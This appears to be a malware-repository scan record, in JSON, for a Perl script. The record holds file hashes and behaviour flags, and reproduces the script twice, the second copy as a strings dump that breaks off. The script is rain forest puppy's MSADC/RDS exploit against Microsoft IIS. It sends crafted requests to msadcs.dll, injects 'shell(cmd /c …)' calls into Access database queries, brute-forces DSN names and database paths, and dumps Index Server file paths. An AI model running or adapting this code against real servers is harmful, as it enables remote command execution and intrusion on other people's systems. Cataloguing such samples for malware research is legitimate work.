{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "User-Agent": "May download files from the Internet",
            "Windows": "May enumerate application windows",
            "command": "May run PowerShell commands",
            "open": "May open a file",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "#!/usr/bin/perl\n#\n# MSADC/RDS 'usage' (aka exploit) script version 2\n#\n#\tby rain forest puppy\n#\n#\t- added UNC support, really didn't clean up code, but oh well\n\nuse Socket; use Getopt::Std;\ngetopts(\"e:vd:h:XRVNwcu:s:\", \\%args);\n\nprint \"-- RDS smack v2 - rain forest puppy / ADM / wiretrip --\\n\";\n\nif (!defined $args{h} && !defined $args{R}) {\nprint qq~\nUsage: msadc.pl -h <host> { -d <delay> -X -v }\n\t-h <host> \t\t= host you want to scan (ip or domain)\n\t-d <seconds>\t\t= delay between calls, default 1 second\n\t-X\t\t\t= dump Index Server path table, if available\n\t-N\t\t\t= query VbBusObj for NetBIOS name\n\t-V\t\t\t= use VbBusObj instead of ActiveDataFactory\n\t-v\t\t\t= verbose\n\t-e\t\t\t= external dictionary file for step 5\n\t-u <\\\\\\\\host\\\\share\\\\file>\t= use UNC file\n\t-w\t\t\t= Windows 95 instead of Windows NT\n\t-c\t\t\t= v1 compatibility (three step query)\n\t-s <number>\t\t= run only step <number>\n\n\tOr a -R will resume a (v2) command session\n\n~; exit;}\n\n###########################################################\n# config data\n\n@drives=(\"c\",\"d\",\"e\",\"f\",\"g\",\"h\");\n\n@sysdirs=(\"winnt\",\"winnt35\",\"winnt351\",\"win\",\"windows\");\n\n# we want 'wicca' first, because if step 2 made the DSN, it's ready to go\n@dsns=(\"wicca\", \"AdvWorks\", \"pubs\", \"CertSvr\", \"CFApplications\",\n\t\"cfexamples\", \"CFForums\", \"CFRealm\", \"cfsnippets\", \"UAM\",\n\t\"banner\", \"banners\", \"ads\", \"ADCDemo\", \"ADCTest\");\n\n# this is sparse, because I don't know of many\n@sysmdbs=(\t\"\\\\catroot\\\\icatalog.mdb\",\n\t\t\"\\\\help\\\\iishelp\\\\iis\\\\htm\\\\tutorial\\\\eecustmr.mdb\",\n\t\t\"\\\\system32\\\\help\\\\iishelp\\\\iis\\\\htm\\\\tutorial\\\\eecustmr.mdb\",\n\t\t\"\\\\system32\\\\certmdb.mdb\",\n\t\t\"\\\\system32\\\\ias\\\\ias.mdb\",\n\t\t\"\\\\system32\\\\ias\\\\dnary.mdb\",\n\t\t\"\\\\system32\\\\certlog\\\\certsrv.mdb\" ); #these are %systemroot%\n@mdbs=(\t\"\\\\cfusion\\\\cfapps\\\\cfappman\\\\data\\\\applications.mdb\",\n\t\"\\\\cfusion\\\\cfapps\\\\forums\\\\forums_.mdb\",\n\t\"\\\\cfusion\\\\cfapps\\\\forums\\\\data\\\\forums.mdb\",\n\t\"\\\\cfusion\\\\cfapps\\\\security\\\\realm_.mdb\",\n\t\"\\\\cfusion\\\\cfapps\\\\security\\\\data\\\\realm.mdb\",\n\t\"\\\\cfusion\\\\database\\\\cfexamples.mdb\",\n\t\"\\\\cfusion\\\\database\\\\cfsnippets.mdb\",\n\t\"\\\\inetpub\\\\iissamples\\\\sdk\\\\asp\\\\database\\\\authors.mdb\",\n\t\"\\\\progra~1\\\\common~1\\\\system\\\\msadc\\\\samples\\\\advworks.mdb\",\n\t\"\\\\cfusion\\\\brighttiger\\\\database\\\\cleam.mdb\",\n\t\"\\\\cfusion\\\\database\\\\smpolicy.mdb\",\n\t\"\\\\cfusion\\\\database\\cypress.mdb\",\n\t\"\\\\progra~1\\\\ableco~1\\\\ablecommerce\\\\databases\\\\acb2_main1.mdb\",\n\t\"\\\\website\\\\cgi-win\\\\dbsample.mdb\",\n\t\"\\\\perl\\\\prk\\\\bookexamples\\\\modsamp\\\\database\\\\contact.mdb\",\n\t\"\\\\perl\\\\prk\\\\bookexamples\\\\utilsamp\\\\data\\\\access\\\\prk.mdb\"\n\t);  #these are just \\\n###########################################################\n\n$ip=$args{h}; $clen=0; $reqlen=0; $|=1; $target=\"\";\nif (defined $args{v}) { $verbose=1; } else {$verbose=0;} \nif (defined $args{d}) { $delay=$args{d};} else {$delay=1;}\nif(!defined $args{R}){ $target= inet_aton($ip) \n\t|| die(\"inet_aton problems; host doesn't exist?\");}\nif (!defined $args{R}){ $ret = &has_msadc; }\n\nif (defined $args{X}) { &hork_idx; exit; }\nif (defined $args{N}) { &get_name; exit; }\n\nif (defined $args{w}){$comm=\"command /c\";} else {$comm=\"cmd /c\";}\nif (defined $args{R}) { &load; exit; }\n\nprint \"Type the command line you want to run ($comm assumed):\\n\"\n\t. \"$comm \";\n$in=<STDIN>;    chomp $in;\n$command=\"$comm \" . $in ;\n\nif (!defined $args{s} || $args{s}==1){\nprint \"\\nStep 1: Trying raw driver to btcustmr.mdb\\n\";\n&try_btcustmr;}\n\nif (!defined $args{s} || $args{s}==2){\nprint \"\\nStep 2: Trying to make our own DSN...\";\nif (&make_dsn){ print \"<<success>>\\n\"; sleep(3); } else {\n\tprint \"<<fail>>\\n\"; }}   # we need to sleep to let the server catchup\n\nif (!defined $args{s} || $args{s}==3){\nprint \"\\nStep 3: Trying known DSNs...\";\n&known_dsn;}\n\nif (!defined $args{s} || $args{s}==4){\nprint \"\\nStep 4: Trying known .mdbs...\";\n&known_mdb;}\n\nif (!defined $args{s} || $args{s}==5){\nif (defined $args{u}){\nprint \"\\xStep 5: Trying UNC...\";\n&use_unc; } else { \"\\nNo -u; Step 5 skipped.\\n\"; }}\n\nif (!defined $args{s} || $args{s}==6){\nif (defined $args{e}){\nprint \"\\nStep 6: Trying dictionary of DSN names...\";\n&dsn_dict; } else { \"\\nNo -e; Step 6 skipped.\\n\"; }}\n\nprint \"\\n\\nNo luck, guess you'll have to use a real hack, eh?\\n\";\nexit;\n\n##############################################################################\n\nsub sendraw { \t# this saves the whole transaction anyway\n\tmy ($pstr)=@_;\n\tsocket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||\n\t\tdie(\"Socket problems\\n\");\n\tif(connect(S,pack \"SnA4x8\",2,80,$target)){\n\t\topen(OUT,\">raw.out\");   my @in;\n\t\tselect(S);\t$|=1; \tprint $pstr;\t\t\n\t\twhile(<S>){ print OUT $_; push @in, $_; \n\t\t\tprint STDOUT \".\" if(defined $args{X});}\n\t\tclose(OUT); select(STDOUT); close(S); return @in;\n\t} else { die(\"Can't connect...\\n\"); }}\n\n##############################################################################\n\nsub make_header {  # make the HTTP request\nmy $aa, $bb;\nif (defined $args{V}){\n$aa=\"VbBusObj.VbBusObjCls.GetRecordset\";\n$bb=\"2\";\n} else {\n$aa=\"AdvancedDataFactory.Query\";\n$bb=\"3\";}\n\n$msadc=<<EOT\nPOST /msadc/msadcs.dll/$aa HTTP/1.1\nUser-Agent: ACTIVEDATA\nHost: $ip\nContent-Length: $clen\nConnection: Keep-Alive\n\nADCClientVersion:01.06\nContent-Type: multipart/mixed; boundary=!ADM!ROX!YOUR!WORLD!; num-args=$bb\n\n--!ADM!ROX!YOUR!WORLD!\nContent-Type: application/x-varg\nContent-Length: $reqlen\n\nEOT\n;\n$msadc=~s/\\n/\\r\\n/g;\nreturn $msadc;}\n\n##############################################################################\n\nsub make_req {  # make the RDS request\nmy ($switch, $p1, $p2)=@_;\nmy $req=\"\"; my $t1, $t2, $query, $dsn;\n\nif ($switch==1){ # this is the btcustmr.mdb query\n$query=\"Select * from Customers where City='|shell(\\\"$command\\\")|'\";\n$dsn=\"driver={Microsoft Access Driver (*.mdb)};dbq=\" .\n\t$p1 . \":\\\\\" . $p2 . \"\\\\help\\\\iis\\\\htm\\\\tutorial\\\\btcustmr.mdb;\";}\n\nelsif ($switch==2){ # this is general make table query\n$query=\"create table AZZ (B int, C varchar(10))\";\n$dsn=\"$p1\";}\n\nelsif ($switch==3){ # this is general exploit table query\n$query=\"select * from AZZ where C='|shell(\\\"$command\\\")|'\";\n$dsn=\"$p1\";}\n\nelsif ($switch==4){ # attempt to hork file info from index server\n$query=\"select path from scope()\";\n$dsn=\"Provider=MSIDXS;\";}\n\nelsif ($switch==5){ # bad query\n$query=\"select\";\n$dsn=\"$p1\";}\n\nelsif ($switch==6){ # this is table-independant query (new)\n$query=\"select * from MSysModules where name='|shell(\\\"$command\\\")|'\";\n$dsn=\"$p1\";}\n\n$t1= make_unicode($query);\n$t2= make_unicode($dsn);\nif(defined $args{V}) { $req=\"\"; } else {$req = \"\\x02\\x00\\x03\\x00\"; }\n$req.= \"\\x08\\x00\" . pack (\"S1\", length($t1));\n$req.= \"\\x00\\x00\" . $t1 ;\n$req.= \"\\x08\\x00\" . pack (\"S1\", length($t2));\n$req.= \"\\x00\\x00\" . $t2 ;\n$req.=\"\\r\\n--!ADM!ROX!YOUR!WORLD!--\\r\\n\";\nreturn $req;}\n\n##############################################################################\n\nsub make_unicode { # quick little function to convert to unicode\nmy ($in)=@_; my $out;\nfor ($c=0; $c < length($in); $c++) { $out.=substr($in,$c,1) . \"\\x00\"; }\nreturn $out;}\n\n##############################################################################\n\nsub rdo_success {  # checks for RDO return success (this is kludge)\nmy (@in) = @_; my $base=content_start(@in);\nif($in[$base]=~/multipart\\/mixed/){\nreturn 1 if( $in[$base+10]=~/^\\x09\\x00/ );}\nreturn 0;}\n\n##############################################################################\n\nsub make_dsn {  # this (tries to) make a DSN for us\nprint \"\\nMaking DSN: \";\nforeach $drive (@drives) {\nprint \"$drive: \";\nmy @results=sendraw(\"GET /scripts/tools/newdsn.exe?driver=Microsoft\\%2B\" .\n\t\"Access\\%2BDriver\\%2B\\%28*.mdb\\%29\\&dsn=wicca\\&dbq=\"\n\t. $drive . \"\\%3A\\%5Csys.mdb\\&newdb=CREATE_DB\\&attr= HTTP/1.0\\n\\n\");\n$results[0]=~m#HTTP\\/([0-9\\.]+) ([0-9]+) ([^\\n]*)#;\nreturn 0 if $2 eq \"404\"; # not found/doesn't exist\nif($2 eq \"200\") {\n  foreach $line (@results) {\n    return 1 if $line=~/<H2>Datasource creation successful<\\/H2>/;}}\n} return 0;}\n\n##############################################################################\n\nsub verify_exists {\nmy ($page)=@_;\nmy @results=sendraw(\"GET $page HTTP/1.0\\n\\n\");\nreturn $results[0];}\n\n##############################################################################\n\nsub try_btcustmr {\n\nforeach $dir (@sysdirs) {\n print \"$dir -> \"; # fun status so you can see progress\n foreach $drive (@drives) {\n print \"$drive: \";  # ditto\n$reqlen=length( make_req(1,$drive,$dir) ) - 28;\n$reqlenlen=length( \"$reqlen\" );\n$clen= 206 + $reqlenlen + $reqlen;\n\nmy @results=sendraw(make_header() . make_req(1,$drive,$dir));\nif (rdo_success(@results)){print \"Success!\\n\";\n\nsave(\"dbq=\".$drive.\":\\\\\".$dir.\"\\\\help\\\\iis\\\\htm\\\\tutorial\\\\btcustmr.mdb;\");\n\texit;}\nelse { verbose(odbc_error(@results)); funky(@results);}} print \"\\n\";}}\n\n##############################################################################\n\nsub odbc_error {\nmy (@in)=@_; my $base;\nmy $base = content_start(@in);\nif($in[$base]=~/application\\/x-varg/){ # it *SHOULD* be this\n$in[$base+4]=~s/[^a-zA-Z0-9 \\[\\]\\:\\/\\\\'\\(\\)]//g; \n$in[$base+5]=~s/[^a-zA-Z0-9 \\[\\]\\:\\/\\\\'\\(\\)]//g; \n$in[$base+6]=~s/[^a-zA-Z0-9 \\[\\]\\:\\/\\\\'\\(\\)]//g; \nreturn $in[$base+4].$in[$base+5].$in[$base+6];}\nprint \"\\nNON-STANDARD error.  Please sent this info to rfp\\@wiretrip.net:\\n\";\nprint \"$in : \" . $in[$base] . $in[$base+1] . $in[$base+2] . $in[$base+3] .\n\t$in[$base+4] . $in[$base+5] . $in[$base+6]; exit;}\n\n##############################################################################\n\nsub verbose {\nmy ($in)=@_;\nreturn if !$verbose;\nprint STDOUT \"\\n$in\\n\";}\n\n##############################################################################\n\nsub save {\nmy ($p1)=@_; my $ropt=\"\";\nopen(OUT, \">rds.save\") || print \"Problem saving parameters...\\n\";\nif (defined $args{c}){ $ropt=\"c \";}\nif (defined $args{V}){ $ropt.=\"V \";}\nif (defined $args{w}){ $ropt.=\"w \";}\nprint OUT \"v2\\n$ip\\n$ropt\\n$p1\\n\";\nclose OUT;}\n\n##############################################################################\n\nsub load {\nmy ($action)=@_;\nmy @p; my $drvst=\"driver={Microsoft Access Driver (*.mdb)};\";\nopen(IN,\"<rds.save\") || die(\"Couldn't open rds.save\\n\");\n@p=<IN>; close(IN);\ndie(\"Wrong rds.save version\") if $p[0] ne \"v2\\n\";\n$ip=\"$p[1]\"; $ip=~s/\\n//g;\n$target= inet_aton($ip) || die(\"inet_aton problems\");\nprint \"Resuming to $ip ...\";\n@switches=split(/ /,$p[2]);\nforeach $switch (@switches) {\n\t$args{$switch}=\"1\";}\n\nif (defined $args{w}){$comm=\"command /c\";} else {$comm=\"cmd /c\";}\nprint \"Type the command line you want to run ($comm assumed):\\n\"\n\t. \"$comm \";\n$in=<STDIN>;    chomp $in;\n$command=\"$comm \" . $in ;\n\n$torun=\"$p[3]\"; $torun=~s/\\n//g;\nif($torun=~/btcustmr/){ \n\t$args{'c'}=\"1\";}   # this is a kludge to make it work\n\nif($torun=~/^dbq/){ $torun=$drvst.$torun; }\n\nif(run_query(\"$torun\")){\n\tprint \"Success!\\n\";} else { print \"failed\\n\"; }\nexit;}\n\n##############################################################################\n\nsub create_table {\nreturn 1 if (!defined $args{c});\nreturn 1 if (defined $args{V});\nmy ($in)=@_;\n$reqlen=length( make_req(2,$in,\"\") ) - 28;\n$reqlenlen=length( \"$reqlen\" );\n$clen= 206 + $reqlenlen + $reqlen;\nmy @results=sendraw(make_header() . make_req(2,$in,\"\"));\nreturn 1 if rdo_success(@results);\nmy $temp= odbc_error(@results);  verbose($temp);\nreturn 1 if $temp=~/Table 'AZZ' already exists/;\nreturn 0;}\n\n##############################################################################\n\nsub known_dsn {\nforeach $dSn (@dsns) {\n\tprint \".\";\n\tnext if (!is_access(\"DSN=$dSn\"));\n\tif(create_table(\"DSN=$dSn\")){\n\tif(run_query(\"DSN=$dSn\")){\n\tprint \"$dSn: Success!\\n\"; save (\"dsn=$dSn\"); exit; }}} print \"\\n\";}\n\n##############################################################################\n\nsub is_access {\nmy ($in)=@_;\nreturn 1 if (!defined $args{c});\nreturn 1 if (defined $args{V});\n$reqlen=length( make_req(5,$in,\"\") ) - 28;\n$reqlenlen=length( \"$reqlen\" );\n$clen= 206 + $reqlenlen + $reqlen;\nmy @results=sendraw(make_header() . make_req(5,$in,\"\"));\nmy $temp= odbc_error(@results);\nverbose($temp); return 1 if ($temp=~/Microsoft Access/);\nreturn 0;}\n\n##############################################################################\n\nsub run_query {\nmy ($in)=@_; my $req;\nif (defined $args{c}){$req=3;} else {$req=6;}\n$reqlen=length( make_req($req,$in,\"\") ) - 28;\n\n$reqlenlen=length( \"$reqlen\" );\n$clen= 206 + $reqlenlen + $reqlen;\nmy @results=sendraw(make_header() . make_req($req,$in,\"\"));\nreturn 1 if rdo_success(@results);\nmy $temp= odbc_error(@results);  verbose($temp);\nreturn 0;}\n\n##############################################################################\n\nsub known_mdb {\nmy @drives=(\"c\",\"d\",\"e\",\"f\",\"g\");\nmy @dirs=(\"winnt\",\"winnt35\",\"winnt351\",\"win\",\"windows\");\nmy $dir, $drive, $mdb;\nmy $drv=\"driver={Microsoft Access Driver (*.mdb)}; dbq=\";\n\nforeach $drive (@drives) {\n foreach $dir (@sysdirs){\n  foreach $mdb (@sysmdbs) {\n   print \".\";\n   if(create_table($drv.$drive.\":\\\\\".$dir.$mdb)){\n    if(run_query($drv . $drive . \":\\\\\" . $dir . $mdb)){\n     print \"$mdb: Success!\\n\"; save (\"dbq=\".$drive .\":\\\\\".$dir.$mdb); exit; \n    }}}}}\n\n foreach $drive (@drives) {\n  foreach $mdb (@mdbs) {\n   print \".\";\n   if(create_table($drv.$drive.\":\".$mdb)){\n    if(run_query($drv.$drive.\":\".$mdb)){\n     print \"$mdb: Success!\\n\"; save (\"dbq=\".$drive.\":\".$mdb); exit; \n    }}}}\n}\n\n##############################################################################\n\nsub hork_idx {\nprint \"\\nAttempting to dump Index Server tables...\\n\";\nprint \"  NOTE:  Sometimes this takes a while, other times it stalls\\n\\n\";\n$reqlen=length( make_req(4,\"\",\"\") ) - 28;\n$reqlenlen=length( \"$reqlen\" );\n$clen= 206 + $reqlenlen + $reqlen;\nmy @results=sendraw(make_header() . make_req(4,\"\",\"\"));\nif (rdo_success(@results)){\nmy $max=@results; my $c; my %d;\nfor($c=19; $c<$max; $c++){\n\t$results[$c]=~s/\\x00//g;\n\t$results[$c]=~s/[^a-zA-Z0-9:~ \\\\\\._]{1,40}/\\n/g;\n\t$results[$c]=~s/[^a-zA-Z0-9:~ \\\\\\._\\n]//g;\n\t$results[$c]=~/([a-zA-Z]\\:\\\\)([a-zA-Z0-9 _~\\\\]+)\\\\/;\n\t$d{\"$1$2\"}=\"\";}\nforeach $c (keys %d){ print \"$c\\n\"; }\n} else {print \"Index server not installed/query failed\\n\"; }}\n\n##############################################################################\n\nsub dsn_dict {\nopen(IN, \"<$args{e}\") || die(\"Can't open external dictionary\\n\");\nwhile(<IN>){\n\t$hold=$_; $hold=~s/[\\r\\n]//g; $dSn=\"$hold\"; print \".\";\n\tnext if (!is_access(\"DSN=$dSn\"));\n\tif(create_table(\"DSN=$dSn\")){\n\tif(run_query(\"DSN=$dSn\")){\n\tprint \"Success!\\n\"; save (\"dsn=$dSn\"); exit; }}} \nprint \"\\n\"; close(IN);}\n\n##############################################################################\n\nsub content_start { # this will take in the server headers\nmy (@in)=@_; my $c;\nfor ($c=1;$c<500;$c++) { # assume there's less than 500 headers\n if($in[$c] =~/^\\x0d\\x0a/){\n  if ($in[$c+1]=~/^HTTP\\/1.[01] [12]00/) { $c++; }\n  else { return $c+1; }}}\nreturn -1;} # it should never get here actually \n\n##############################################################################\n\nsub funky {\nmy (@in)=@_; my $error=odbc_error(@in);\nif($error=~/ADO could not find the specified provider/){\nprint \"\\nServer returned an ADO miscofiguration message\\nAborting.\\n\";\nexit;}\nif($error=~/A Handler is required/){\nprint \"\\nServer has custom handler filters (they most likely are patched)\\n\";\nexit;}\nif($error=~/specified Handler has denied Access/){\nprint \"\\nADO handlers denied access (they most likely are patched)\\n\";\nexit;}\nif($error=~/server has denied access/){\nprint \"\\nADO handlers denied access (they most likely are patched)\\n\";\nexit;}}\n\n##############################################################################\n\nsub has_msadc {\nmy @results=sendraw(\"GET /msadc/msadcs.dll HTTP/1.0\\n\\n\");\nmy $base=content_start(@results);\nreturn if($results[$base]=~/Content-Type: application\\/x-varg/);\nmy @s=grep(\"^Server:\",@results);\nif($s[0]!~/IIS/){ print \"Doh! They're not running IIS.\\n$s[0]\\n\" }\nelse { print \"/msadc/msadcs.dll was not found.\\n\";}\nexit;}\n\n##############################################################################\n\nsub use_unc {\n$uncpath=$args{u};\n$driverline=\"driver={Microsoft Access Driver (*.mdb)};dbq=\";\nif(!$uncpath=~/^\\\\\\\\[a-zA-Z0-9_.]+\\\\[-a-zA-Z0-9_]+\\\\.+/){\n\tprint   \"Your UNC path sucks.  You need the following format:\\n\".\n\t\t\"\\\\server(ip preferable)\\share\\some-file.mdb\\n\\n\"; exit; }\n\nif(create_table($driverline.$uncpath)){\n  if(run_query($driverline.$uncpath)){\n     print \"Success!\\n\"; save (\"dbq=\".$uncpath); exit;}}\n}\n\n##############################################################################\n\nsub get_name { # this was added last minute\nmy $msadc=<<EOT\nPOST /msadc/msadcs.dll/VbBusObj.VbBusObjCls.GetMachineName HTTP/1.1\nUser-Agent: ACTIVEDATA\nHost: $ip\nContent-Length: 126\nConnection: Keep-Alive\n\nADCClientVersion:01.06\nContent-Type: multipart/mixed; boundary=!ADM!ROX!YOUR!WORLD!; num-args=0\n\n--!ADM!ROX!YOUR!WORLD!--\nEOT\n;  $msadc=~s/\\n/\\r\\n/g;\nmy @results=sendraw($msadc);\nmy $base=content_start(@results);\n$results[$base+6]=~s/[^-A-Za-z0-9!\\@\\#\\$\\%^\\&*()\\[\\]_=+~<>.,?]//g;\nprint \"Machine name: $results[$base+6]\\n\";}\n\n##############################################################################\n# special greets to trambottic, hex_edit, vacuum (technotronic), all #!adm,\n# #!w00w00 & #rhino9 (that's a lot of people, and they are all very elite and \n# good friends!), wiretrip, l0pht, nmrc & all of phrack\n#\n# thumbs up to packetstorm, hackernews, phrack, securityfocus, ntsecadvice\n#\n# I wish I could really name everyone, but I can't.  Don't feel slighted if\n# your not on the list... :)\n##############################################################################\n#                 www.hack.co.za           [2000]#"
    },
    "filename": "VirusShare_04c4c572cac6ef92d7666fffa2fcc5ec",
    "filesize": 17397,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "04c4c572cac6ef92d7666fffa2fcc5ec",
        "sha1": "ac3edd35806edb79a787d952ae39c949eec3a33c",
        "sha256": "3c37acf8b4c312335ab888d2240b467a89eac3cd0c046f3c9ea6e66f7a05fbcf"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "# MSADC/RDS 'usage' (aka exploit) script version 2",
            "#\tby rain forest puppy",
            "#\t- added UNC support, really didn't clean up code, but oh well",
            "use Socket; use Getopt::Std;",
            "getopts(\"e:vd:h:XRVNwcu:s:\", \\%args);",
            "print \"-- RDS smack v2 - rain forest puppy / ADM / wiretrip --\\n\";",
            "if (!defined $args{h} && !defined $args{R}) {",
            "print qq~",
            "Usage: msadc.pl -h <host> { -d <delay> -X -v }",
            "\t-h <host> \t\t= host you want to scan (ip or domain)",
            "\t-d <seconds>\t\t= delay between calls, default 1 second",
            "\t-X\t\t\t= dump Index Server path table, if available",
            "\t-N\t\t\t= query VbBusObj for NetBIOS name",
            "\t-V\t\t\t= use VbBusObj instead of ActiveDataFactory",
            "\t-v\t\t\t= verbose",
            "\t-e\t\t\t= external dictionary file for step 5",
            "\t-u <\\\\\\\\host\\\\share\\\\file>\t= use UNC file",
            "\t-w\t\t\t= Windows 95 instead of Windows NT",
            "\t-c\t\t\t= v1 compatibility (three step query)",
            "\t-s <number>\t\t= run only step <number>",
            "\tOr a -R will resume a (v2) command session",
            "~; exit;}",
            "###########################################################",
            "# config data",
            "@drives=(\"c\",\"d\",\"e\",\"f\",\"g\",\"h\");",
            "@sysdirs=(\"winnt\",\"winnt35\",\"winnt351\",\"win\",\"windows\");",
            "# we want 'wicca' first, because if step 2 made the DSN, it's ready to go",
            "@dsns=(\"wicca\", \"AdvWorks\", \"pubs\", \"CertSvr\", \"CFApplications\",",
            "\t\"cfexamples\", \"CFForums\", \"CFRealm\", \"cfsnippets\", \"UAM\",",
            "\t\"banner\", \"banners\", \"ads\", \"ADCDemo\", \"ADCTest\");",
            "# this is sparse, because I don't know of many",
            "@sysmdbs=(\t\"\\\\catroot\\\\icatalog.mdb\",",
            "\t\t\"\\\\help\\\\iishelp\\\\iis\\\\htm\\\\tutorial\\\\eecustmr.mdb\",",
            "\t\t\"\\\\system32\\\\help\\\\iishelp\\\\iis\\\\htm\\\\tutorial\\\\eecustmr.mdb\",",
            "\t\t\"\\\\system32\\\\certmdb.mdb\",",
            "\t\t\"\\\\system32\\\\ias\\\\ias.mdb\",",
            "\t\t\"\\\\system32\\\\ias\\\\dnary.mdb\",",
            "\t\t\"\\\\system32\\\\certlog\\\\certsrv.mdb\" ); #these are %systemroot%",
            "@mdbs=(\t\"\\\\cfusion\\\\cfapps\\\\cfappman\\\\data\\\\applications.mdb\",",
            "\t\"\\\\cfusion\\\\cfapps\\\\forums\\\\forums_.mdb\",",
            "\t\"\\\\cfusion\\\\cfapps\\\\forums\\\\data\\\\forums.mdb\",",
            "\t\"\\\\cfusion\\\\cfapps\\\\security\\\\realm_.mdb\",",
            "\t\"\\\\cfusion\\\\cfapps\\\\security\\\\data\\\\realm.mdb\",",
            "\t\"\\\\cfusion\\\\database\\\\cfexamples.mdb\",",
            "\t\"\\\\cfusion\\\\database\\\\cfsnippets.mdb\",",
            "\t\"\\\\inetpub\\\\iissamples\\\\sdk\\\\asp\\\\database\\\\authors.mdb\",",
            "\t\"\\\\progra~1\\\\common~1\\\\system\\\\msadc\\\\samples\\\\advworks.mdb\",",
            "\t\"\\\\cfusion\\\\brighttiger\\\\database\\\\cleam.mdb\",",
            "\t\"\\\\cfusion\\\\database\\\\smpolicy.mdb\",",
            "\t\"\\\\cfusion\\\\database\\cypress.mdb\",",
            "\t\"\\\\progra~1\\\\ableco~1\\\\ablecommerce\\\\databases\\\\acb2_main1.mdb\",",
            "\t\"\\\\website\\\\cgi-win\\\\dbsample.mdb\",",
            "\t\"\\\\perl\\\\prk\\\\bookexamples\\\\modsamp\\\\database\\\\contact.mdb\",",
            "\t\"\\\\perl\\\\prk\\\\bookexamples\\\\utilsamp\\\\data\\\\access\\\\prk.mdb\"",
            "\t);  #these are just \\",
            "###########################################################",
            "$ip=$args{h}; $clen=0; $reqlen=0; $|=1; $target=\"\";",
            "if (defined $args{v}) { $verbose=1; } else {$verbose=0;} ",
            "if (defined $args{d}) { $delay=$args{d};} else {$delay=1;}",
            "if(!defined $args{R}){ $target= inet_aton($ip) ",
            "\t|| die(\"inet_aton problems; host doesn't exist?\");}",
            "if (!defined $args{R}){ $ret = &has_msadc; }",
            "if (defined $args{X}) { &hork_idx; exit; }",
            "if (defined $args{N}) { &get_name; exit; }",
            "if (defined $args{w}){$comm=\"command /c\";} else {$comm=\"cmd /c\";}",
            "if (defined $args{R}) { &load; exit; }",
            "print \"Type the command line you want to run ($comm assumed):\\n\"",
            "\t. \"$comm \";",
            "$in=<STDIN>;    chomp $in;",
            "$command=\"$comm \" . $in ;",
            "if (!defined $args{s} || $args{s}==1){",
            "print \"\\nStep 1: Trying raw driver to btcustmr.mdb\\n\";",
            "&try_btcustmr;}",
            "if (!defined $args{s} || $args{s}==2){",
            "print \"\\nStep 2: Trying to make our own DSN...\";",
            "if (&make_dsn){ print \"<<success>>\\n\"; sleep(3); } else {",
            "\tprint \"<<fail>>\\n\"; }}   # we need to sleep to let the server catchup",
            "if (!defined $args{s} || $args{s}==3){",
            "print \"\\nStep 3: Trying known DSNs...\";",
            "&known_dsn;}",
            "if (!defined $args{s} || $args{s}==4){",
            "print \"\\nStep 4: Trying known .mdbs...\";",
            "&known_mdb;}",
            "if (!defined $args{s} || $args{s}==5){",
            "if (defined $args{u}){",
            "print \"\\xStep 5: Trying UNC...\";",
            "&use_unc; } else { \"\\nNo -u; Step 5 skipped.\\n\"; }}",
            "if (!defined $args{s} || $args{s}==6){",
            "if (defined $args{e}){",
            "print \"\\nStep 6: Trying dictionary of DSN names...\";",
            "&dsn_dict; } else { \"\\nNo -e; Step 6 skipped.\\n\"; }}",
            "print \"\\n\\nNo luck, guess you'll have to use a real hack, eh?\\n\";",
            "exit;",
            "##############################################################################",
            "sub sendraw { \t# this saves the whole transaction anyway",
            "\tmy ($pstr)=@_;",
            "\tsocket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||",
            "\t\tdie(\"Socket problems\\n\");",
            "\tif(connect(S,pack \"SnA4x8\",2,80,$target)){",
            "\t\topen(OUT,\">raw.out\");   my @in;",
            "\t\tselect(S);\t$|=1; \tprint $pstr;\t\t",
            "\t\twhile(<S>){ print OUT $_; push @in, $_; ",
            "\t\t\tprint STDOUT \".\" if(defined $args{X});}",
            "\t\tclose(OUT); select(STDOUT); close(S); return @in;",
            "\t} else { die(\"Can't connect...\\n\"); }}",
            "##############################################################################",
            "sub make_header {  # make the HTTP request",
            "my $aa, $bb;",
            "if (defined $args{V}){",
            "$aa=\"VbBusObj.VbBusObjCls.GetRecordset\";",
            "$bb=\"2\";",
            "} else {",
            "$aa=\"AdvancedDataFactory.Query\";",
            "$bb=\"3\";}",
            "$msadc=<<EOT",
            "POST /msadc/msadcs.dll/$aa HTTP/1.1",
            "User-Agent: ACTIVEDATA",
            "Host: $ip",
            "Content-Length: $clen",
            "Connection: Keep-Alive",
            "ADCClientVersion:01.06",
            "Content-Type: multipart/mixed; boundary=!ADM!ROX!YOUR!WORLD!; num-args=$bb",
            "--!ADM!ROX!YOUR!WORLD!",
            "Content-Type: application/x-varg",
            "Content-Length: $reqlen",
            "$msadc=~s/\\n/\\r\\n/g;",
            "return $msadc;}",
            "##############################################################################",
            "sub make_req {  # make the RDS request",
            "my ($switch, $p1, $p2)=@_;",
            "my $req=\"\"; my $t1, $t2, $query, $dsn;",
            "if ($switch==1){ # this is the btcustmr.mdb query",
            "$query=\"Select * from Customers where City='|shell(\\\"$command\\\")|'\";",
            "$dsn=\"driver={Microsoft Access Driver (*.mdb)};dbq=\" .",
            "\t$p1 . \":\\\\\" . $p2 . \"\\\\help\\\\iis\\\\htm\\\\tutorial\\\\btcustmr.mdb;\";}",
            "elsif ($switch==2){ # this is general make table query",
            "$query=\"create table AZZ (B int, C varchar(10))\";",
            "$dsn=\"$p1\";}",
            "elsif ($switch==3){ # this is general exploit table query",
            "$query=\"select * from AZZ where C='|shell(\\\"$command\\\")|'\";",
            "$dsn=\"$p1\";}",
            "elsif ($switch==4){ # attempt to hork file info from index server",
            "$query=\"select path from scope()\";",
            "$dsn=\"Provider=MSIDXS;\";}",
            "elsif ($switch==5){ # bad query",
            "$query=\"select\";",
            "$dsn=\"$p1\";}",
            "elsif ($switch==6){ # this is table-independant query (new)",
            "$query=\"select * from MSysModules where name='|shell(\\\"$command\\\")|'\";",
            "$dsn=\"$p1\";}",
            "$t1= make_unicode($query);",
            "$t2= make_unicode($dsn);",
            "if(defined $args{V}) { $req=\"\"; } else {$req = \"\\x02\\x00\\x03\\x00\"; }",
